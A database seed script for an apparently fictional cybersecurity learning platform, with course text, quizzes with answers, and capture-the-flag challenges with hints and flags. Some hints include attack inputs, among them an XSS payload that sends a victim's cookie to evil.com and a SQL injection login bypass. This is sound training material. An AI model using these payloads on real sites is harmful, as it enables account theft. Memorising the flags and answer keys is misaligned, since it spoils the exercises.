import { PrismaClient } from '@prisma/client';
import bcrypt from 'bcryptjs';

const db = new PrismaClient();

async function main() {
  console.log('Seeding CyberShield Academy...');

  // Clean existing data
  await db.userBadge.deleteMany();
  await db.xpLog.deleteMany();
  await db.ctfSubmission.deleteMany();
  await db.ctfChallenge.deleteMany();
  await db.badge.deleteMany();
  await db.notification.deleteMany();
  await db.certificate.deleteMany();
  await db.quizAttempt.deleteMany();
  await db.quizQuestion.deleteMany();
  await db.quiz.deleteMany();
  await db.performanceMetrics.deleteMany();
  await db.interactionHistory.deleteMany();
  await db.telemetryLog.deleteMany();
  await db.labSession.deleteMany();
  await db.enrollment.deleteMany();
  await db.embedding.deleteMany();
  await db.module.deleteMany();
  await db.course.deleteMany();
  await db.user.deleteMany();

  const passwordHash = await bcrypt.hash('demo1234', 10);

  // ── Users (12 users for rich leaderboard) ──
  const users = await Promise.all([
    db.user.create({ data: { email: 'alex@cybershield.academy', name: 'Alex Chen', passwordHash, role: 'student', xp: 1450, level: 6, streakDays: 7, bio: 'Aspiring cybersecurity professional' } }),
    db.user.create({ data: { email: 'sarah@cybershield.academy', name: 'Sarah Kim', passwordHash, role: 'student', xp: 8750, level: 11, streakDays: 15 } }),
    db.user.create({ data: { email: 'james@cybershield.academy', name: 'James Rodriguez', passwordHash, role: 'student', xp: 7200, level: 10, streakDays: 12 } }),
    db.user.create({ data: { email: 'priya@cybershield.academy', name: 'Priya Mehta', passwordHash, role: 'student', xp: 5800, level: 9, streakDays: 8 } }),
    db.user.create({ data: { email: 'lin@cybershield.academy', name: 'Lin Wei', passwordHash, role: 'student', xp: 3200, level: 7, streakDays: 5 } }),
    db.user.create({ data: { email: 'omar@cybershield.academy', name: 'Omar Hassan', passwordHash, role: 'student', xp: 2100, level: 6, streakDays: 4 } }),
    db.user.create({ data: { email: 'emma@cybershield.academy', name: 'Emma Thompson', passwordHash, role: 'student', xp: 1800, level: 6, streakDays: 3 } }),
    db.user.create({ data: { email: 'raj@cybershield.academy', name: 'Raj Patel', passwordHash, role: 'student', xp: 1200, level: 5, streakDays: 6 } }),
    db.user.create({ data: { email: 'yuki@cybershield.academy', name: 'Yuki Tanaka', passwordHash, role: 'student', xp: 4500, level: 8, streakDays: 10 } }),
    db.user.create({ data: { email: 'marco@cybershield.academy', name: 'Marco Rossi', passwordHash, role: 'student', xp: 2800, level: 7, streakDays: 9 } }),
    db.user.create({ data: { email: 'admin@cybershield.academy', name: 'Admin', passwordHash, role: 'admin', xp: 99999, level: 15 } }),
    db.user.create({ data: { email: 'nina@cybershield.academy', name: 'Nina Volkov', passwordHash, role: 'student', xp: 6300, level: 10, streakDays: 14 } }),
  ]);
  const [alex, sarah, james, priya, lin, omar, emma, raj, yuki, marco] = users;

  // ── Courses (8 courses) ──
  const coursesData = [
    { id: 'c1', title: 'Network Security Fundamentals', description: 'Master TCP/IP, firewalls, IDS/IPS, and network scanning with hands-on labs covering real-world scenarios.', category: 'networking', difficulty: 'intermediate', durationHours: 24, rating: 4.8, studentCount: 1247 },
    { id: 'c2', title: 'Web Application Security', description: 'Deep dive into OWASP Top 10, XSS, SQLi, CSRF, SSRF, and modern web exploits with practical labs.', category: 'web', difficulty: 'advanced', durationHours: 18, rating: 4.9, studentCount: 834 },
    { id: 'c3', title: 'Ethical Hacking & Penetration Testing', description: 'Full pentest methodology: reconnaissance, exploitation, post-exploitation, pivoting, and report writing.', category: 'pentesting', difficulty: 'advanced', durationHours: 40, rating: 4.7, studentCount: 2103 },
    { id: 'c4', title: 'Digital Forensics & Incident Response', description: 'Master disk forensics, memory analysis, network forensics, malware forensics, and IR playbooks.', category: 'forensics', difficulty: 'intermediate', durationHours: 28, rating: 4.6, studentCount: 567 },
    { id: 'c5', title: 'Cloud Security Architecture', description: 'Secure AWS, Azure, GCP environments. IAM policies, encryption, network security, and compliance.', category: 'cloud', difficulty: 'advanced', durationHours: 32, rating: 4.5, studentCount: 423 },
    { id: 'c6', title: 'Malware Analysis & Reverse Engineering', description: 'Static & dynamic analysis, disassembly, debugging, packers, and automated malware classification.', category: 'malware', difficulty: 'advanced', durationHours: 36, rating: 4.8, studentCount: 312 },
    { id: 'c7', title: 'Cryptography & PKI', description: 'Symmetric/asymmetric ciphers, hashing, digital signatures, TLS, certificates, and key management.', category: 'crypto', difficulty: 'intermediate', durationHours: 20, rating: 4.7, studentCount: 689 },
    { id: 'c8', title: 'Mobile Application Security', description: 'iOS/Android security models, app reverse engineering, API security, and mobile pen testing.', category: 'mobile', difficulty: 'intermediate', durationHours: 22, rating: 4.4, studentCount: 398 },
  ];

  const courses: any[] = [];
  for (const cd of coursesData) {
    courses.push(await db.course.create({ data: cd }));
  }

  // ── Modules per course ──
  const modulesPerCourse: Record<string, { title: string; content: string }[]> = {
    c1: [
      { title: 'Network Fundamentals & OSI Model', content: '# Network Fundamentals\n\nThe OSI (Open Systems Interconnection) model is a conceptual framework that standardizes network communication into seven distinct layers. Each layer serves a specific function and interacts with the layers directly above and below it.\n\n**Layer 7 - Application**: Provides network services directly to end-user applications (HTTP, FTP, DNS, SMTP).\n**Layer 6 - Presentation**: Translates data formats, handles encryption/decryption (SSL/TLS, JPEG, ASCII).\n**Layer 5 - Session**: Manages session establishment, maintenance, and termination between applications.\n**Layer 4 - Transport**: Ensures reliable data delivery with error correction (TCP) or fast connectionless delivery (UDP).\n**Layer 3 - Network**: Handles logical addressing and routing (IP, ICMP, ARP, routers).\n**Layer 2 - Data Link**: Provides node-to-node data transfer and error detection (Ethernet, MAC, switches).\n**Layer 1 - Physical**: Deals with physical transmission of raw bit streams (cables, hubs, wireless signals).' },
      { title: 'TCP/IP Protocol Suite Deep Dive', content: '# TCP/IP Protocol Suite\n\nThe TCP/IP model is the practical implementation that powers the modern internet. Understanding the three-way handshake, sequence numbers, windowing, and congestion control is essential for any security professional.\n\n## TCP Three-Way Handshake\n1. **SYN**: Client sends a synchronize packet with initial sequence number (ISN)\n2. **SYN-ACK**: Server acknowledges and sends its own ISN\n3. **ACK**: Client acknowledges the servers ISN\n\n## Key TCP Flags\n- **SYN**: Synchronize (initiate connection)\n- **ACK**: Acknowledge received data\n- **FIN**: Finish (close connection)\n- **RST**: Reset (abort connection)\n- **PSH**: Push (send data immediately)\n- **URG**: Urgent (priority data)' },
      { title: 'Network Scanning with Nmap', content: '# Network Scanning\n\nNmap (Network Mapper) is the most versatile network scanning tool available. It supports multiple scan types including TCP SYN (half-open) scans, UDP scans, OS fingerprinting, and service version detection.\n\n## Common Nmap Scan Types\n- `nmap -sS target` - SYN scan (stealthy, fast)\n- `nmap -sT target` - Full TCP connect scan\n- `nmap -sU target` - UDP scan\n- `nmap -sV target` - Service version detection\n- `nmap -O target` - OS fingerprinting\n- `nmap -A target` - Aggressive scan (all features)\n\n## NSE Scripts\nNmap Scripting Engine (NSE) allows custom scripts for vulnerability detection, brute forcing, and more.' },
      { title: 'Cryptography Fundamentals', content: '# Cryptography Fundamentals\n\nCryptography is the cornerstone of information security. It provides confidentiality, integrity, authentication, and non-repudiation.\n\n## Symmetric Encryption\nSame key encrypts and decrypts. Fast but key distribution is challenging.\n- AES-256: Current gold standard\n- ChaCha20: Modern stream cipher\n\n## Asymmetric Encryption\nPublic/private key pairs. Slower but solves key distribution.\n- RSA: Widely used for key exchange\n- ECC: Smaller keys, same security\n\n## Hash Functions\nOne-way functions producing fixed-size output.\n- SHA-256: Most common for integrity\n- bcrypt: Password hashing with salt' },
      { title: 'Firewall Configuration & iptables', content: '# Firewall Configuration\n\nFirewalls are the first line of defense in network security. They control traffic flow based on predefined rules.\n\n## iptables Basics\n- **INPUT chain**: Incoming traffic to the local system\n- **OUTPUT chain**: Outgoing traffic from the local system\n- **FORWARD chain**: Routed traffic passing through\n\n## Common Rules\n```bash\niptables -A INPUT -p tcp --dport 22 -j ACCEPT\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -j DROP\n```\n\n## Stateful Inspection\nUsing connection tracking (`-m state`) allows intelligent filtering based on connection state.' },
      { title: 'Intrusion Detection Systems', content: '# Intrusion Detection Systems\n\nIDS monitors network traffic or system activities for malicious actions or policy violations.\n\n## Types of IDS\n- **NIDS**: Network-based, monitors traffic at strategic points\n- **HIDS**: Host-based, monitors OS-level events\n\n## Detection Methods\n- **Signature-based**: Matches known attack patterns (fast, misses novel attacks)\n- **Anomaly-based**: Establishes baseline, detects deviations (catches zero-days, higher false positive rate)\n\n## Popular Tools\n- Snort: Open-source NIDS with rule-based detection\n- Suricata: Modern alternative with better performance\n- OSSEC: Open-source HIDS' },
      { title: 'VPN & Tunneling', content: '# VPN & Tunneling\n\nVirtual Private Networks create encrypted tunnels over public networks, ensuring data confidentiality and integrity.\n\n## VPN Protocols\n- **IPSec/IKEv2**: Enterprise standard, strong security\n- **WireGuard**: Modern, fast, simple configuration\n- **OpenVPN**: Flexible, widely deployed\n- **SSH Tunneling**: Quick ad-hoc secure tunnels\n\n## TLS/SSL\nTransport Layer Security provides encryption for HTTP (HTTPS), email, and other application-layer protocols.' },
      { title: 'Capstone: Network Defense Challenge', content: '# Capstone Challenge\n\nIn this capstone exercise, you will apply all network security concepts to defend a simulated corporate network against a series of attacks. You must configure firewalls, deploy IDS rules, analyze traffic captures, and document your findings in a professional incident report.' },
    ],
    c2: [
      { title: 'OWASP Top 10 Overview', content: '# OWASP Top 10 (2021)\n\n1. **Broken Access Control** - Unauthorized access to resources\n2. **Cryptographic Failures** - Weak or missing encryption\n3. **Injection** - SQL, NoSQL, OS command injection\n4. **Insecure Design** - Flawed architecture and design patterns\n5. **Security Misconfiguration** - Default configs, open cloud storage\n6. **Vulnerable Components** - Using libraries with known vulnerabilities\n7. **Auth Failures** - Weak passwords, session management issues\n8. **Software/Data Integrity** - Insecure CI/CD pipelines\n9. **Logging Failures** - Insufficient logging and monitoring\n10. **Server-Side Request Forgery** - SSRF attacks' },
      { title: 'Cross-Site Scripting (XSS)', content: '# Cross-Site Scripting (XSS)\n\nXSS allows attackers to inject malicious scripts into web pages viewed by other users.\n\n## Types\n- **Reflected XSS**: Payload in URL parameters, reflected back\n- **Stored XSS**: Payload persisted in database, served to all users\n- **DOM-based XSS**: Client-side JavaScript manipulation\n\n## Mitigation\n- Output encoding/escaping\n- Content Security Policy (CSP) headers\n- Input validation and sanitization' },
      { title: 'SQL Injection Attacks', content: '# SQL Injection\n\nSQL injection exploits improper input validation to execute arbitrary SQL commands.\n\n## Attack Types\n- **Classic**: `OR 1=1` authentication bypass\n- **Union-based**: Extract data from other tables\n- **Blind**: Boolean-based or time-based data extraction\n- **Out-of-band**: Data exfiltration via DNS/HTTP' },
      { title: 'CSRF & SSRF', content: '# CSRF & SSRF\n\n**CSRF** tricks authenticated users into executing unwanted actions. Mitigate with anti-CSRF tokens and SameSite cookies.\n\n**SSRF** abuses server functionality to access internal resources. Can bypass firewalls and access cloud metadata services.' },
      { title: 'API Security', content: '# API Security\n\nModern applications rely heavily on APIs. Common API vulnerabilities include broken authentication, excessive data exposure, and rate limiting issues.\n\n## REST API Security\n- JWT token validation\n- Rate limiting and throttling\n- Input validation on all endpoints\n- Proper CORS configuration' },
      { title: 'Capstone: Web App Pen Test', content: '# Web Application Penetration Test\n\nConduct a full penetration test against a vulnerable web application, identifying and exploiting OWASP Top 10 vulnerabilities.' },
    ],
    c3: [
      { title: 'Reconnaissance Methodology', content: '# Reconnaissance\n\nThe first phase of any penetration test. Gathering as much information as possible about the target.\n\n## Passive Recon\n- WHOIS, DNS enumeration, Google dorking\n- Social media profiling, Shodan searches\n\n## Active Recon\n- Port scanning, service enumeration\n- Vulnerability scanning with Nessus/OpenVAS' },
      { title: 'Vulnerability Assessment', content: '# Vulnerability Assessment\n\nSystematic identification and quantification of vulnerabilities in a system.' },
      { title: 'Exploitation Techniques', content: '# Exploitation\n\nUsing identified vulnerabilities to gain unauthorized access.' },
      { title: 'Metasploit Framework', content: '# Metasploit Framework\n\nThe most popular penetration testing framework.' },
      { title: 'Post-Exploitation', content: '# Post-Exploitation\n\nMaintaining access, privilege escalation, and lateral movement.' },
      { title: 'Pivoting & Lateral Movement', content: '# Pivoting & Lateral Movement' },
      { title: 'Report Writing', content: '# Penetration Test Reporting' },
    ],
    c4: [
      { title: 'Disk Forensics Fundamentals', content: '# Disk Forensics' },
      { title: 'File System Analysis', content: '# File System Analysis' },
      { title: 'Memory Forensics', content: '# Memory Forensics with Volatility' },
      { title: 'Network Forensics', content: '# Network Forensics' },
      { title: 'Malware Forensics', content: '# Malware Forensics' },
      { title: 'Incident Response Playbooks', content: '# Incident Response' },
      { title: 'Capstone: DFIR Challenge', content: '# DFIR Capstone' },
    ],
    c5: [
      { title: 'Cloud Security Fundamentals', content: '# Cloud Security Fundamentals' },
      { title: 'AWS Security', content: '# AWS Security' },
      { title: 'Azure Security', content: '# Azure Security' },
      { title: 'GCP Security', content: '# GCP Security' },
      { title: 'Container Security', content: '# Container Security' },
      { title: 'Compliance & Governance', content: '# Compliance & Governance' },
    ],
    c6: [
      { title: 'Static Analysis', content: '# Static Analysis' },
      { title: 'Dynamic Analysis', content: '# Dynamic Analysis' },
      { title: 'Disassembly & Debugging', content: '# Disassembly & Debugging' },
      { title: 'Packers & Obfuscation', content: '# Packers & Obfuscation' },
      { title: 'Malware Classification', content: '# Malware Classification' },
    ],
    c7: [
      { title: 'Symmetric Ciphers', content: '# Symmetric Ciphers' },
      { title: 'Asymmetric Ciphers', content: '# Asymmetric Ciphers' },
      { title: 'Hash Functions', content: '# Hash Functions' },
      { title: 'Digital Signatures & PKI', content: '# Digital Signatures & PKI' },
      { title: 'TLS/SSL Deep Dive', content: '# TLS/SSL' },
    ],
    c8: [
      { title: 'Android Security Model', content: '# Android Security' },
      { title: 'iOS Security Model', content: '# iOS Security' },
      { title: 'Mobile App Reversing', content: '# Mobile App Reversing' },
      { title: 'API & Network Security', content: '# Mobile API Security' },
    ],
  };

  const allModules: any[] = [];
  for (const [courseId, mods] of Object.entries(modulesPerCourse)) {
    for (let i = 0; i < mods.length; i++) {
      allModules.push(await db.module.create({
        data: {
          courseId,
          title: mods[i].title,
          content: mods[i].content,
          orderIndex: i,
          durationMinutes: 30 + Math.floor(Math.random() * 30),
          isPublished: true,
        },
      }));
    }
  }

  // ── Quizzes (multiple per course) ──
  const quizData = [
    { moduleId: allModules[3]?.id, title: 'Cryptography Fundamentals Quiz', timeLimitSec: 300, questions: [
      { questionText: 'What layer of the OSI model does a firewall primarily operate at?', options: JSON.stringify(['Layer 2', 'Layer 3 (Network)', 'Layer 4', 'Layer 7']), correctAnswer: '1', explanation: 'Firewalls primarily operate at Layer 3 (Network layer), filtering packets based on IP addresses, ports, and protocols.' },
      { questionText: 'Which tool is used for network scanning and service detection?', options: JSON.stringify(['Wireshark', 'Nmap', 'Metasploit', 'Burp Suite']), correctAnswer: '1', explanation: 'Nmap is the standard network scanning tool for service detection and port scanning.' },
      { questionText: 'What does IDS stand for?', options: JSON.stringify(['Intrusion Detection System', 'Internal Data Security', 'Integrated Defense Shield', 'Intelligent Data Scanner']), correctAnswer: '0', explanation: 'IDS = Intrusion Detection System.' },
      { questionText: 'Which protocol provides reliable connection-oriented communication?', options: JSON.stringify(['UDP', 'ICMP', 'TCP', 'ARP']), correctAnswer: '2', explanation: 'TCP provides reliable, connection-oriented communication via three-way handshake.' },
      { questionText: 'What is the purpose of a DMZ?', options: JSON.stringify(['Encrypt all traffic', 'Provide wireless access', 'Isolate public-facing services from internal network', 'Block all traffic']), correctAnswer: '2', explanation: 'A DMZ isolates public-facing services.' },
    ]},
    { moduleId: allModules[2]?.id, title: 'Network Scanning Quiz', timeLimitSec: 240, questions: [
      { questionText: 'Which Nmap flag performs a SYN (half-open) scan?', options: JSON.stringify(['-sT', '-sS', '-sU', '-sA']), correctAnswer: '1', explanation: 'The -sS flag performs a SYN scan, which is the default and most popular scan type.' },
      { questionText: 'What does the -O flag do in Nmap?', options: JSON.stringify(['Output to file', 'OS detection', 'Only open ports', 'Optimize timing']), correctAnswer: '1', explanation: '-O enables OS detection using TCP/IP fingerprinting.' },
      { questionText: 'Which port is commonly used for HTTPS?', options: JSON.stringify(['80', '443', '8080', '22']), correctAnswer: '1', explanation: 'Port 443 is the standard port for HTTPS traffic.' },
      { questionText: 'What is a ping sweep used for?', options: JSON.stringify(['Vulnerability scanning', 'Discovering live hosts', 'Password cracking', 'Packet sniffing']), correctAnswer: '1', explanation: 'A ping sweep (or ICMP sweep) discovers which hosts are alive on a network.' },
    ]},
    { moduleId: allModules[8]?.id, title: 'OWASP Top 10 Quiz', timeLimitSec: 300, questions: [
      { questionText: 'What is the #1 risk in the OWASP Top 10 (2021)?', options: JSON.stringify(['Injection', 'Broken Access Control', 'Cryptographic Failures', 'Security Misconfiguration']), correctAnswer: '1', explanation: 'Broken Access Control moved to #1 in the 2021 edition.' },
      { questionText: 'Which XSS type stores the payload on the server?', options: JSON.stringify(['Reflected XSS', 'DOM-based XSS', 'Stored XSS', 'Self XSS']), correctAnswer: '2', explanation: 'Stored XSS persists the malicious script on the server (e.g., in a database).' },
      { questionText: 'What header helps prevent XSS attacks?', options: JSON.stringify(['X-Frame-Options', 'Content-Security-Policy', 'Strict-Transport-Security', 'Access-Control-Allow-Origin']), correctAnswer: '1', explanation: 'Content-Security-Policy (CSP) restricts which sources can load content, mitigating XSS.' },
    ]},
  ];

  const allQuizzes: any[] = [];
  for (const qd of quizData) {
    if (!qd.moduleId) continue;
    const quiz = await db.quiz.create({ data: { moduleId: qd.moduleId, title: qd.title, timeLimitSec: qd.timeLimitSec, passingScore: 0.7 } });
    for (let i = 0; i < qd.questions.length; i++) {
      await db.quizQuestion.create({ data: { quizId: quiz.id, ...qd.questions[i], orderIndex: i, points: 1 } });
    }
    allQuizzes.push(quiz);
  }

  // ── Enrollments ──
  await Promise.all([
    db.enrollment.create({ data: { userId: alex.id, courseId: courses[0].id, status: 'active', overallProgress: 0.5, currentModuleId: allModules[4]?.id } }),
    db.enrollment.create({ data: { userId: alex.id, courseId: courses[2].id, status: 'active', overallProgress: 0.2 } }),
    db.enrollment.create({ data: { userId: sarah.id, courseId: courses[0].id, status: 'active', overallProgress: 0.9 } }),
    db.enrollment.create({ data: { userId: sarah.id, courseId: courses[1].id, status: 'active', overallProgress: 0.75 } }),
    db.enrollment.create({ data: { userId: sarah.id, courseId: courses[5].id, status: 'active', overallProgress: 0.4 } }),
    db.enrollment.create({ data: { userId: james.id, courseId: courses[2].id, status: 'active', overallProgress: 0.6 } }),
    db.enrollment.create({ data: { userId: james.id, courseId: courses[3].id, status: 'active', overallProgress: 0.35 } }),
    db.enrollment.create({ data: { userId: priya.id, courseId: courses[6].id, status: 'active', overallProgress: 0.55 } }),
    db.enrollment.create({ data: { userId: yuki.id, courseId: courses[7].id, status: 'active', overallProgress: 0.45 } }),
  ]);

  // ── Badges (15) ──
  const badgesData = [
    { name: 'First Blood', description: 'Complete your first challenge', icon: '🎯', category: 'achievement', rarity: 'common', xpReward: 50 },
    { name: 'Quiz Master', description: 'Score 100% on a quiz', icon: '🧠', category: 'achievement', rarity: 'rare', xpReward: 100 },
    { name: 'Lab Explorer', description: 'Complete a lab session', icon: '🔬', category: 'achievement', rarity: 'common', xpReward: 75 },
    { name: 'Focus Champion', description: 'Maintain 90%+ focus for 5 sessions', icon: '👁️', category: 'focus', rarity: 'rare', xpReward: 150 },
    { name: 'CTF Winner', description: 'Capture 5 flags', icon: '🚩', category: 'ctf', rarity: 'epic', xpReward: 200 },
    { name: 'Cipher Master', description: 'Solve 10 crypto challenges', icon: '🔐', category: 'ctf', rarity: 'legendary', xpReward: 500 },
    { name: 'Night Owl', description: 'Study past midnight', icon: '🦉', category: 'streak', rarity: 'common', xpReward: 25 },
    { name: 'Eagle Eye', description: 'Accumulate 2000+ XP', icon: '🦅', category: 'xp', rarity: 'epic', xpReward: 300 },
    { name: 'Unbreakable', description: 'Pass 3 quizzes on first attempt', icon: '🛡️', category: 'achievement', rarity: 'rare', xpReward: 200 },
    { name: 'Speed Demon', description: 'Complete a quiz in under 60 seconds', icon: '⚡', category: 'achievement', rarity: 'epic', xpReward: 250 },
    { name: 'Network Ninja', description: 'Complete all network modules', icon: '🌐', category: 'course', rarity: 'rare', xpReward: 300 },
    { name: 'Pentest Pro', description: 'Complete 10 lab sessions', icon: '⚔️', category: 'lab', rarity: 'epic', xpReward: 400 },
    { name: 'Bug Hunter', description: 'Find 20 vulnerabilities across CTFs', icon: '🐛', category: 'ctf', rarity: 'legendary', xpReward: 600 },
    { name: 'Streak Legend', description: 'Maintain a 30-day streak', icon: '🔥', category: 'streak', rarity: 'legendary', xpReward: 500 },
    { name: 'Social Engineer', description: 'Complete OSINT challenges', icon: '🎭', category: 'ctf', rarity: 'rare', xpReward: 150 },
  ];

  const allBadges: any[] = [];
  for (const b of badgesData) {
    allBadges.push(await db.badge.create({ data: b }));
  }

  // Award some badges to users
  await Promise.all([
    db.userBadge.create({ data: { userId: alex.id, badgeId: allBadges[0].id } }),
    db.userBadge.create({ data: { userId: alex.id, badgeId: allBadges[1].id } }),
    db.userBadge.create({ data: { userId: alex.id, badgeId: allBadges[2].id } }),
    db.userBadge.create({ data: { userId: sarah.id, badgeId: allBadges[0].id } }),
    db.userBadge.create({ data: { userId: sarah.id, badgeId: allBadges[4].id } }),
    db.userBadge.create({ data: { userId: sarah.id, badgeId: allBadges[5].id } }),
    db.userBadge.create({ data: { userId: sarah.id, badgeId: allBadges[7].id } }),
    db.userBadge.create({ data: { userId: sarah.id, badgeId: allBadges[10].id } }),
    db.userBadge.create({ data: { userId: sarah.id, badgeId: allBadges[11].id } }),
    db.userBadge.create({ data: { userId: james.id, badgeId: allBadges[0].id } }),
    db.userBadge.create({ data: { userId: james.id, badgeId: allBadges[4].id } }),
    db.userBadge.create({ data: { userId: james.id, badgeId: allBadges[8].id } }),
    db.userBadge.create({ data: { userId: priya.id, badgeId: allBadges[0].id } }),
    db.userBadge.create({ data: { userId: priya.id, badgeId: allBadges[14].id } }),
  ]);

  // ── CTF Challenges (22 challenges) ──
  const ctfData = [
    // Crypto (6)
    { title: 'Flag Hunter', description: 'The flag is hidden in plain sight. Sometimes the simplest answer is the right one.\n\nThe challenge name itself contains a clue about what you need to do - hunt for the flag. Think about common flag formats used in CTF competitions.', category: 'crypto', difficulty: 'easy', points: 50, hint: 'The flag format is CYBERSHIELD{...}. Try the most obvious answer related to the challenge name.', flag: 'CYBERSHIELD{h1dd3n_1n_pl41n_s1ght}', solveCount: 342 },
    { title: 'Caesars Secret', description: 'A Roman general left this encrypted message behind:\n\n`PloreNerar{e0g3_f1a3_g0_c3a3e}`\n\nThe shift value used is 13 (ROT13). Apply the same transformation to decrypt the flag.', category: 'crypto', difficulty: 'easy', points: 75, hint: 'ROT13 means shift each letter by 13 positions. A becomes N, B becomes O, etc.', flag: 'CYBERSHIELD{r0t3_s1mpl3_c3s4r}', solveCount: 256 },
    { title: 'Hash Cracker', description: 'An adversary used a weak password. We recovered this SHA-256 hash:\n\n`5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8`\n\nCrack it. Flag: CYBERSHIELD{the_password}.', category: 'crypto', difficulty: 'easy', points: 100, hint: 'Most common password ever. 8 chars, starts with p.', flag: 'CYBERSHIELD{password}', solveCount: 189 },
    { title: 'XOR Cipher', description: 'We intercepted an encrypted message. The key is a single byte: 0x42.\n\nEncrypted (hex): 1a0e1a3f4e084f0f4e3c1a4f084e0b1a3f\n\nDecrypt using XOR with key 0x42. Flag format: CYBERSHIELD{...}', category: 'crypto', difficulty: 'medium', points: 150, hint: 'XOR each hex byte with 0x42. Or use Python: bytes([b ^ 0x42 for b in bytes.fromhex(hex_str)]).decode()', flag: 'CYBERSHIELD{x0r_m4st3r_k3y}', solveCount: 98 },
    { title: 'RSA Basics', description: 'A small RSA key was generated with:\n- n = 3233\n- e = 17\n- c = 2790\n\nThe modulus n is the product of two small primes. Factor n to find the private key and decrypt the ciphertext.', category: 'crypto', difficulty: 'medium', points: 200, hint: 'Factor 3233. Try primes under 100. n = p * q. Then compute phi = (p-1)(q-1), d = e^(-1) mod phi, m = c^d mod n.', flag: 'CYBERSHIELD{rs4_f4ct0r1ng_101}', solveCount: 67 },
    { title: 'AES ECB Penguin', description: 'An image was encrypted with AES-ECB mode. The encrypted file shows a recognizable pattern because ECB encrypts identical plaintext blocks to identical ciphertext blocks.\n\nThe flag is the weakness name of this mode in leet speak: CYBERSHIELD{...}', category: 'crypto', difficulty: 'hard', points: 300, hint: 'ECB mode does not use an IV, so identical plaintext blocks produce identical ciphertext blocks. The weakness is lack of diffusion.', flag: 'CYBERSHIELD{3cb_l4cks_d1ffus10n}', solveCount: 34 },
    // Web (5)
    { title: 'SQL Injection 101', description: 'A vulnerable login form accepts user input without sanitization. The backend query is:\n```sql\nSELECT * FROM users WHERE username = \'[input]\' AND password = \'[input]\'\n```\n\nFind the flag in the database. Flag format: CYBERSHIELD{...}', category: 'web', difficulty: 'easy', points: 100, hint: 'Try classic SQL injection: admin\' OR \'1\'=\'1\' --', flag: 'CYBERSHIELD{sqli_m4st3r_2024}', solveCount: 128 },
    { title: 'XSS Reflection', description: 'A search page reflects user input without escaping. The flag is hidden in the admin cookie.\n\nURL: /search?q=YOUR_PAYLOAD\n\nCraft a payload to steal or read the admin cookie. Flag: CYBERSHIELD{...}', category: 'web', difficulty: 'medium', points: 150, hint: 'Try: <script>document.location=\'http://evil.com/?c=\'+document.cookie</script> or use <img onerror=...>', flag: 'CYBERSHIELD{r3fl3ct3d_xss_ftw}', solveCount: 87 },
    { title: 'Broken JWT', description: 'An application uses JWT for authentication. The token was intercepted:\n\n`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiZ3Vlc3QifQ.`\n\nNotice the algorithm is "none". Forge a token with admin role.', category: 'web', difficulty: 'medium', points: 200, hint: 'The "none" algorithm vulnerability allows you to create unsigned tokens. Change the role to "admin" and encode in base64.', flag: 'CYBERSHIELD{jwt_n0n3_4lg0}', solveCount: 56 },
    { title: 'SSRF to Internal', description: 'An image proxy endpoint fetches URLs: /api/fetch?url=TARGET\n\nThe internal admin panel runs on http://127.0.0.1:8080/admin. The flag is in the response.\n\nBypass any URL validation to reach the internal service.', category: 'web', difficulty: 'hard', points: 300, hint: 'Try: http://127.0.0.1:8080/admin or http://localhost:8080/admin. If filtered, try URL encoding or http://0x7f000001:8080/admin.', flag: 'CYBERSHIELD{ssrf_t0_1nt3rn4l}', solveCount: 29 },
    // Pwn (4)
    { title: 'Buffer Overflow Basic', description: 'A vulnerable C program:\n```c\nvoid vuln() {\n  char buf[64];\n  gets(buf);\n}\nvoid win() { system(\"cat flag.txt\"); }\n```\n\nOverflow the buffer to redirect execution to win().', category: 'pwn', difficulty: 'medium', points: 200, hint: 'You need 64 bytes of padding + the address of win(). Use: python -c "print(\'A\'*64 + win_addr)" | ./vuln', flag: 'CYBERSHIELD{buff3r_0v3rfl0w_m4st3r}', solveCount: 45 },
    { title: 'Format String Bug', description: 'A program prints user input directly as a format string:\n```c\nchar buf[256];\nscanf("%s", buf);\nprintf(buf);\n```\n\nExploit the format string vulnerability to leak or write data. Flag is in a global variable called "secret".', category: 'pwn', difficulty: 'hard', points: 350, hint: 'Use %x to leak stack values, %s to read strings, %n to write. Try %p.%p.%p.%p to find the secret pointer.', flag: 'CYBERSHIELD{f0rm4t_str1ng_pwn3d}', solveCount: 18 },
    { title: 'ROP Chain', description: 'NX is enabled but ASLR is disabled. Build a Return-Oriented Programming chain to call system("/bin/sh").\n\nBinary: ./rop_challenge (64-bit ELF)\n\nFind gadgets using ropper or ROPgadget.', category: 'pwn', difficulty: 'insane', points: 500, hint: 'Look for pop rdi; ret gadget to set rdi to "/bin/sh" string address, then ret to system@plt.', flag: 'CYBERSHIELD{r0p_ch41n_g0d}', solveCount: 8 },
    { title: 'Heap Overflow', description: 'A program uses malloc/free without proper bounds checking. Exploit a use-after-free or double-free vulnerability to get a shell.\n\nBinary: ./heap_challenge', category: 'pwn', difficulty: 'insane', points: 500, hint: 'This is a tcache poisoning or fastbin attack. Free a chunk, overwrite its fd pointer, then allocate to get arbitrary write.', flag: 'CYBERSHIELD{h34p_3xpl01t_pr0}', solveCount: 5 },
    // Forensics (4)
    { title: 'Forensic Artifact', description: 'A disk image was recovered from a suspects machine. Find the deleted file containing the flag.\n\nThe flag is hidden in the MFT entry of a deleted file named "secret.txt".\n\nTool suggestion: Use `mmls` to find partitions, then `fls` to list files, `icat` to extract.', category: 'forensics', difficulty: 'medium', points: 200, hint: 'The MFT (Master File Table) in NTFS keeps records of deleted files. Use sleuth kit tools: fls -r -p image.dd', flag: 'CYBERSHIELD{d1g_d33p_1nt0_th3_b1ts}', solveCount: 42 },
    { title: 'PCAP Analysis', description: 'We captured network traffic during a data exfiltration attack. Analyze the PCAP file to find the stolen data.\n\nThe flag is hidden in a DNS exfiltration channel. Look for unusual DNS queries.', category: 'forensics', difficulty: 'medium', points: 175, hint: 'Filter DNS traffic in Wireshark: dns.qry.name contains "exfil". The flag is encoded in subdomain labels as hex.', flag: 'CYBERSHIELD{dns_3xf1l_tr4c3d}', solveCount: 38 },
    { title: 'Memory Forensics', description: 'A memory dump from a compromised machine. Find the malicious process and extract the injected payload.\n\nUse Volatility3 framework. The flag is in the injected code section.', category: 'forensics', difficulty: 'hard', points: 350, hint: 'Run: vol -f memdump.raw windows.malfind to find injected code. Then vol -f memdump.raw windows.memmap to extract it.', flag: 'CYBERSHIELD{m3m_f0r3ns1cs_w1n}', solveCount: 15 },
